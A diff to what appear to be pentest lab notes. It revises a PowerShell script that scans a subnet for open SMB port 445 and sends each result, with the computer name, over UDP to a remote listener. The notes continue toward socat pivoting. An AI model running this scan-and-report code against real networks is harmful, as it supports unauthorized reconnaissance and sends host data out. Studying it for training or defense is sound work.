@@ -30,21 +30,27 @@ $ListenerIP = "10.10.15.252"
 $ListenerPort = 5001
 $subnet = "172.16.2"
 $udpclient = New-Object System.Net.Sockets.UdpClient
+
 100..102 | ForEach-Object { 
     $ip = "$subnet.$_"
-    $socket = New-Object System.Net.Sockets.TcpClient
-    $async = $socket.BeginConnect($ip, 445, $null, $null)
-    if ($async.AsyncWaitHandle.WaitOne(1000, $false)) { 
-        $result = "$env:computername - $ip - 445 is open`n"
+    try {
+        $socket = New-Object System.Net.Sockets.TcpClient
+        $async = $socket.BeginConnect($ip, 445, $null, $null)
+        if ($async.AsyncWaitHandle.WaitOne(1000, $false)) { 
+            $result = "$env:computername - $ip - 445 is open`n"
+        } else {
+            $result = "$env:computername - $ip - 445 is closed`n"
+        }
         $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
-    } 
-    else {
-        $result = "$env:computername - $ip - 445 is closed`n"
+    } catch {
+        $result = "$env:computername - $ip - encountered an error`n"
         $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
+    } finally {
+        $socket.Close()
     }
-    $socket.Close() 
- }
- $udpclient.Close()
+}
+$udpclient.Close()
+
 ```
 
 ### Socat Command
